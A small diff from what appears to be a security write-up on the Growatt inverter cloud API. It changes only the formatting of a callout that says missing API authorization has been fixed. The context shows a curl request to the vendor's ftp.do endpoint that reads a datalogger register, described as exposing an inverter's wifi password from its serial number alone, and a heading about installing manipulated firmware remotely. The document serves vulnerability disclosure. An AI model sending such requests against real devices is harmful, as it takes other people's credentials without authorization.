@@ -45,7 +45,7 @@ Here is the API used to retrieve a wifi password of an inverter, knowing only it
 curl 'https://server.growatt.com/ftp.do' -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' -H 'cookie: JSESSIONID=X; SERVERID=X' -H 'user-agent: okhttp' --data-raw 'action=readDatalogParam&dataLogSn=XGDXXXXXXX&&paramType=set_any_reg&addr=57' 
 ```
 
-> [!NOTE]
+> [📄NOTE📄]
 > Missing API authorization has been fixed.
 
 ## Installing a manipulated firmware remotely
